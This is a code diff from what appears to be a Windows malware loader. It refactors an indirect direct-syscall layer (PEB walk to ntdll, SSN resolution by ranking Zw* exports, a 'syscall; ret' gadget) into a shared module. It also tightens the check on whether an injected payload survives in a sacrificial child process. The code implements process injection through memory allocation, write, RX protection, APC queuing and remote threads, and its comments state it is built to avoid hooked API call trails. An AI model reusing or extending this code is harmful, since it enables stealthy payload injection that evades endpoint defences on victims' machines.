@@ -53,6 +53,7 @@
 
 #include "config.h"
 #include "loader_ids.h"
+#include "ntsys.h"
 #include "rc4.h"
 
 /* How long to keep watching the child after resume before declaring the
@@ -259,331 +260,18 @@ static size_t build_trampoline(unsigned char *buf, uintptr_t tramp_addr,
 #endif
 }
 
-/* ------------------------------------------------------------- NT syscalls */
+/* NT syscall layer lives in core/modules/common/ntsys.{c,h}. */
 
-/*
- * Direct syscall layer (x64), ported from lib/syscall: resolve SSNs by
- * sorting ntdll's Zw* exports, find a `syscall; ret` gadget in ntdll, and
- * invoke syscalls indirectly. This bypasses kernel32/kernelbase wrappers
- * entirely (some of which - QueueUserAPC - are unreliable on hardened
- * hosts), and leaves no hooked-export call trail. x86 builds fall back to
- * the Win32 APIs below.
- */
-#ifdef _WIN64
 
-/* PEB -> Ldr -> InMemoryOrderModuleList walk to find ntdll's base. */
-typedef struct {
-  unsigned short Length;
-  unsigned short MaximumLength;
-  wchar_t *Buffer;
-} ldr_unicode_string;
-
-static uintptr_t find_ntdll(void) {
-  uintptr_t peb = __readgsqword(0x60);
-  uintptr_t ldr = *(uintptr_t *)(peb + 0x18);
-  uintptr_t head = ldr + 0x20; /* InMemoryOrderModuleList */
-  uintptr_t cur = *(uintptr_t *)head;
-
-  while (cur != 0 && cur != head) {
-    uintptr_t dllbase = *(uintptr_t *)(cur + 0x20);
-    ldr_unicode_string *name = (ldr_unicode_string *)(cur + 0x48);
-    if (dllbase != 0 && name->Buffer != NULL) {
-      /* case-insensitive "ntdll.dll" */
-      wchar_t *p = name->Buffer;
-      wchar_t want[] = L"ntdll.dll";
-      unsigned int len = name->Length / sizeof(wchar_t);
-      unsigned int i;
-      if (len == (sizeof(want) / sizeof(wchar_t)) - 1) {
-        for (i = 0; i < len; i++) {
-          wchar_t c = p[i];
-          if (c >= L'A' && c <= L'Z') {
-            c += 32;
-          }
-          if (c != want[i]) {
-            break;
-          }
-        }
-        if (i == len) {
-          return dllbase;
-        }
-      }
-    }
-    cur = *(uintptr_t *)cur;
-  }
-  return 0;
-}
-
-/* resolve the SSN of an Nt* routine by ranking its Zw* twin among all Zw
- * exports sorted by address (the lib/syscall approach) */
-static int resolve_ssn(uintptr_t ntdll, const char *nt_name) {
-  IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)ntdll;
-  IMAGE_NT_HEADERS *nt;
-  IMAGE_EXPORT_DIRECTORY *dir;
-  uint32_t *names, *funcs;
-  uint16_t *ords;
-  uint32_t i, nzw = 0;
-  uintptr_t *zw = NULL;
-  uintptr_t twin = 0;
-  char zname[128];
-  int ssn_count = 0, j;
-
-  if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
-      strncmp(nt_name, "Nt", 2) != 0 || strlen(nt_name) + 1 > sizeof(zname)) {
-    return -1;
-  }
-  nt = (IMAGE_NT_HEADERS *)(ntdll + dos->e_lfanew);
-  if (nt->Signature != IMAGE_NT_SIGNATURE) {
-    return -1;
-  }
-  dir = (IMAGE_EXPORT_DIRECTORY *)(ntdll +
-      nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-  names = (uint32_t *)(ntdll + dir->AddressOfNames);
-  funcs = (uint32_t *)(ntdll + dir->AddressOfFunctions);
-  ords = (uint16_t *)(ntdll + dir->AddressOfNameOrdinals);
-
-  zname[0] = 'Z';
-  zname[1] = 'w';
-  strcpy(zname + 2, nt_name + 2);
-
-  zw = (uintptr_t *)malloc(dir->NumberOfNames * sizeof(uintptr_t));
-  if (zw == NULL) {
-    return -1;
-  }
-  for (i = 0; i < dir->NumberOfNames; i++) {
-    char *cname = (char *)(ntdll + names[i]);
-    if (strncmp(cname, "Zw", 2) == 0) {
-      zw[nzw++] = ntdll + funcs[ords[i]];
-      /* the Nt twin is itself a Zw export; match it here (an else-branch
-       * would never run and SSN resolution would always fail) */
-      if (strcmp(cname, zname) == 0) {
-        twin = ntdll + funcs[ords[i]];
-      }
-    }
-  }
-  if (twin == 0 || nzw == 0) {
-    free(zw);
-    return -1;
-  }
-  /* insertion sort ascending */
-  for (i = 1; i < nzw; i++) {
-    uintptr_t key = zw[i];
-    for (j = (int)i - 1; j >= 0 && zw[j] > key; j--) {
-      zw[j + 1] = zw[j];
-    }
-    zw[j + 1] = key;
-  }
-  for (i = 0; i < nzw; i++) {
-    if (zw[i] == twin) {
-      ssn_count = (int)i;
-      break;
-    }
-  }
-  free(zw);
-  return ssn_count;
-}
-
-/* find a `syscall; ret` gadget in ntdll's executable sections */
-static uintptr_t find_gadget(uintptr_t ntdll) {
-  IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)ntdll;
-  IMAGE_NT_HEADERS *nt;
-  IMAGE_SECTION_HEADER *sec;
-  uint32_t i;
-  unsigned char *p;
-  size_t k, size;
-
-  if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
-    return 0;
-  }
-  nt = (IMAGE_NT_HEADERS *)(ntdll + dos->e_lfanew);
-  sec = IMAGE_FIRST_SECTION(nt);
-  for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-    if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
-        sec[i].SizeOfRawData > 3) {
-      p = (unsigned char *)(ntdll + sec[i].VirtualAddress);
-      size = sec[i].SizeOfRawData;
-      for (k = 0; k + 2 < size; k++) {
-        if (p[k] == 0x0F && p[k + 1] == 0x05 && p[k + 2] == 0xC3) {
-          return (uintptr_t)(p + k);
-        }
-      }
-    }
-  }
-  return 0;
-}
-
-/*
- * nt_invoke runs the syscall for `ssn` through the `syscall; ret` gadget
- * with up to 11 arguments (4 register + 7 stack, matching the Win64 syscall
- * convention: the kernel reads stack args at rsp+0x28 from the syscall
- * point). Returns the raw NTSTATUS in the low 32 bits of rax.
- */
-static long nt_invoke(unsigned long long ssn, uintptr_t gadget,
-                      unsigned long long a1, unsigned long long a2,
-                      unsigned long long a3, unsigned long long a4,
-                      unsigned long long a5, unsigned long long a6,
-                      unsigned long long a7, unsigned long long a8,
-                      unsigned long long a9, unsigned long long a10,
-                      unsigned long long a11) {
-  long ret;
-  __asm__ volatile(
-      "subq $0x48, %%rsp\n\t"
-      "movq %7, 0x20(%%rsp)\n\t"
-      "movq %8, 0x28(%%rsp)\n\t"
-      "movq %9, 0x30(%%rsp)\n\t"
-      "movq %10, 0x38(%%rsp)\n\t"
-      "movq %11, 0x40(%%rsp)\n\t"
-      "movq %12, 0x48(%%rsp)\n\t"
-      "movq %13, 0x50(%%rsp)\n\t"
-      "movq %3, %%r10\n\t"
-      "movq %4, %%rdx\n\t"
-      "movq %5, %%r8\n\t"
-      "movq %6, %%r9\n\t"
-      "movq %1, %%r11\n\t"
-      "movl %k2, %%eax\n\t"
-      "call *%%r11\n\t"
-      "addq $0x48, %%rsp\n\t"
-      : "=a"(ret)
-      : "r"(gadget), "r"(ssn), "r"(a1), "r"(a2), "r"(a3), "r"(a4), "r"(a5),
-        "r"(a6), "r"(a7), "r"(a8), "r"(a9), "r"(a10), "r"(a11)
-      : "r10", "r11", "rdx", "r8", "r9", "rcx", "memory", "cc");
-  return ret;
-}
-
-/* SSN/gadget cache, resolved once */
-static int nt_ready = 0;
-static int nt_failed = 0;
-static uintptr_t nt_gadget = 0;
-static unsigned int ssn_alloc, ssn_write, ssn_protect, ssn_apc, ssn_thread;
-
-static int nt_init(void) {
-  uintptr_t ntdll;
-  int ssn;
-
-  if (nt_ready) {
-    return 1;
-  }
-  if (nt_failed) {
-    return 0;
-  }
-  ntdll = find_ntdll();
-  if (ntdll == 0) {
-    nt_failed = 1;
-    return 0;
-  }
-  nt_gadget = find_gadget(ntdll);
-  if (nt_gadget == 0) {
-    nt_failed = 1;
-    return 0;
-  }
-
-  ssn = resolve_ssn(ntdll, "NtAllocateVirtualMemory");
-  if (ssn < 0) {
-    LOG(L"resolve NtAllocateVirtualMemory failed");
-    goto oops;
-  }
-  ssn_alloc = (unsigned int)ssn;
-  ssn = resolve_ssn(ntdll, "NtWriteVirtualMemory");
-  if (ssn < 0) {
-    LOG(L"resolve NtWriteVirtualMemory failed");
-    goto oops;
-  }
-  ssn_write = (unsigned int)ssn;
-  ssn = resolve_ssn(ntdll, "NtProtectVirtualMemory");
-  if (ssn < 0) {
-    LOG(L"resolve NtProtectVirtualMemory failed");
-    goto oops;
-  }
-  ssn_protect = (unsigned int)ssn;
-  ssn = resolve_ssn(ntdll, "NtQueueApcThread");
-  if (ssn < 0) {
-    LOG(L"resolve NtQueueApcThread failed");
-    goto oops;
-  }
-  ssn_apc = (unsigned int)ssn;
-  ssn = resolve_ssn(ntdll, "NtCreateThreadEx");
-  if (ssn < 0) {
-    LOG(L"resolve NtCreateThreadEx failed");
-    goto oops;
-  }
-  ssn_thread = (unsigned int)ssn;
-
-  LOG(L"syscalls ready: ntdll=%p gadget=%p ssn alloc=%u write=%u protect=%u apc=%u thread=%u",
-      (void *)ntdll, (void *)nt_gadget, ssn_alloc, ssn_write, ssn_protect,
-      ssn_apc, ssn_thread);
-
-  nt_ready = 1;
-  return 1;
-oops:
-  nt_failed = 1;
-  return 0;
-}
-
-static BOOL nt_alloc_rw(HANDLE hproc, void **base, SIZE_T *size) {
-  void *baddr = *base;
-  SIZE_T rsize = *size;
-  long st = nt_invoke(ssn_alloc, nt_gadget, (unsigned long long)hproc,
-                      (unsigned long long)&baddr, 0,
-                      (unsigned long long)&rsize,
-                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0, 0, 0, 0, 0);
-  if (st < 0) {
-    return FALSE;
-  }
-  *base = baddr;
-  *size = rsize;
-  return TRUE;
-}
-
-static BOOL nt_write_mem(HANDLE hproc, void *base, const void *buf, SIZE_T len) {
-  SIZE_T written = 0;
-  long st = nt_invoke(ssn_write, nt_gadget, (unsigned long long)hproc,
-                      (unsigned long long)base, (unsigned long long)buf,
-                      (unsigned long long)len,
-                      (unsigned long long)&written, 0, 0, 0, 0, 0, 0);
-  return st >= 0;
-}
-
-static BOOL nt_protect_rx(HANDLE hproc, void **base, SIZE_T *size) {
-  void *baddr = *base;
-  SIZE_T rsize = *size;
-  DWORD old = 0;
-  long st = nt_invoke(ssn_protect, nt_gadget, (unsigned long long)hproc,
-                      (unsigned long long)&baddr, (unsigned long long)&rsize,
-                      PAGE_EXECUTE_READ, (unsigned long long)&old, 0, 0, 0, 0,
-                      0, 0);
-  return st >= 0;
-}
-
-static BOOL nt_queue_apc(HANDLE hthread, void *routine) {
-  long st = nt_invoke(ssn_apc, nt_gadget, (unsigned long long)hthread,
-                      (unsigned long long)routine, 0, 0, 0, 0, 0, 0, 0, 0, 0);
-  return st >= 0;
-}
-
-static BOOL nt_create_thread(HANDLE hproc, void *routine, HANDLE *out) {
-  HANDLE h = NULL;
-  long st = nt_invoke(ssn_thread, nt_gadget, (unsigned long long)&h,
-                      0x1FFFFF /* THREAD_ALL_ACCESS */, 0,
-                      (unsigned long long)hproc, (unsigned long long)routine,
-                      0 /* start immediately */, 0, 0, 0, 0, 0);
-  if (st < 0 || h == NULL) {
-    return FALSE;
-  }
-  *out = h;
-  return TRUE;
-}
-
-#define HAVE_NT_SYSCALLS 1
-#endif /* _WIN64 */
-
-/* ---- unified injection primitives: NT syscalls on x64, Win32 otherwise ---- */
+/* ---- unified injection primitives: NT syscalls on x64 (ntsys), Win32 ---- */
 
 static BOOL inj_alloc_rw(HANDLE hproc, SIZE_T total, unsigned char **out) {
   *out = NULL;
-#ifdef HAVE_NT_SYSCALLS
-  if (nt_init()) {
+#if NTSYS_HAVE
+  if (ntsys_ready()) {
     void *b = NULL;
     SIZE_T s = total;
-    if (!nt_alloc_rw(hproc, &b, &s)) {
+    if (!ntsys_alloc_rw(hproc, &b, &s)) {
       return FALSE;
     }
     *out = (unsigned char *)b;
@@ -596,18 +284,18 @@ static BOOL inj_alloc_rw(HANDLE hproc, SIZE_T total, unsigned char **out) {
 }
 
 static BOOL inj_write(HANDLE hproc, void *base, const void *buf, SIZE_T len) {
-#ifdef HAVE_NT_SYSCALLS
-  if (nt_ready) {
-    return nt_write_mem(hproc, base, buf, len);
+#if NTSYS_HAVE
+  if (ntsys_ready()) {
+    return ntsys_write_mem(hproc, base, buf, len);
   }
 #endif
   return WriteProcessMemory(hproc, base, buf, len, NULL) != 0;
 }
 
 static BOOL inj_protect_rx(HANDLE hproc, void *base, SIZE_T len) {
-#ifdef HAVE_NT_SYSCALLS
-  if (nt_ready) {
-    return nt_protect_rx(hproc, &base, &len);
+#if NTSYS_HAVE
+  if (ntsys_ready()) {
+    return ntsys_protect_rx(hproc, &base, &len);
   }
 #endif
   {
@@ -617,19 +305,19 @@ static BOOL inj_protect_rx(HANDLE hproc, void *base, SIZE_T len) {
 }
 
 static BOOL inj_queue_apc(HANDLE hthread, void *routine) {
-#ifdef HAVE_NT_SYSCALLS
-  if (nt_ready) {
-    return nt_queue_apc(hthread, routine);
+#if NTSYS_HAVE
+  if (ntsys_ready()) {
+    return ntsys_queue_apc(hthread, routine);
   }
 #endif
   return QueueUserAPC(hthread, (PAPCFUNC)(ULONG_PTR)routine, 0) != 0;
 }
 
 static HANDLE inj_create_thread(HANDLE hproc, void *routine) {
-#ifdef HAVE_NT_SYSCALLS
-  if (nt_ready) {
+#if NTSYS_HAVE
+  if (ntsys_ready()) {
     HANDLE h = NULL;
-    if (nt_create_thread(hproc, routine, &h)) {
+    if (ntsys_create_remote_thread(hproc, routine, &h)) {
       return h;
     }
     return NULL;
@@ -710,6 +398,7 @@ static DWORD spawn_sacrificial(PROCESS_INFORMATION *pi) {
  */
 static DWORD verify_child(PROCESS_INFORMATION *pi) {
   DWORD i;
+  DWORD err = NO_ERROR;
 
   for (i = 0; i < INJECT_VERIFY_MS / 100; i++) {
     DWORD code = 0;
@@ -726,19 +415,25 @@ static DWORD verify_child(PROCESS_INFORMATION *pi) {
     Sleep(100);
     if (!GetExitCodeProcess(pi->hProcess, &code)) {
       LOG(L"GetExitCodeProcess failed: %lu", GetLastError());
+      err = GetLastError();
       break;
     }
     if (code != STILL_ACTIVE) {
-      LOG(L"process %lu exited (code %lu) right after resume",
+      LOG(L"process %lu exited (code %lu) right after resume; the payload "
+              L"did not survive startup",
           pi->dwProcessId, code);
+      err = ERROR_PROCESS_ABORTED;
       break;
     }
   }
 
-  /* The child keeps running (with the agent) on its own either way; a crash
-   * would have been caught above, a still-alive child means success. */
+  /* Child death inside the verify window is a failed load, not a success. */
   g_child = NULL;
   CloseHandle(pi->hProcess);
+  if (err != NO_ERROR) {
+    return err;
+  }
+  LOG(L"payload running in process %lu", pi->dwProcessId);
   return NO_ERROR;
 }
 
@@ -944,10 +639,12 @@ static int selftest(void) {
   /* Regression signal for the SSN resolution (Zw-twin ranking): CI asserts
    * that the syscall table initialized; `ssn=none` means it failed. */
   fputs(" ssn=", stdout);
-#ifdef _WIN64
-  if (nt_init()) {
-    printf("%u,%u,%u,%u,%u", ssn_alloc, ssn_write, ssn_protect, ssn_apc,
-           ssn_thread);
+#if NTSYS_HAVE
+  if (ntsys_ready()) {
+    printf("%u,%u,%u,%u,%u", ntsys_ssn("NtAllocateVirtualMemory"),
+           ntsys_ssn("NtWriteVirtualMemory"),
+           ntsys_ssn("NtProtectVirtualMemory"), ntsys_ssn("NtQueueApcThread"),
+           ntsys_ssn("NtCreateThreadEx"));
   } else {
     printf("none");
   }
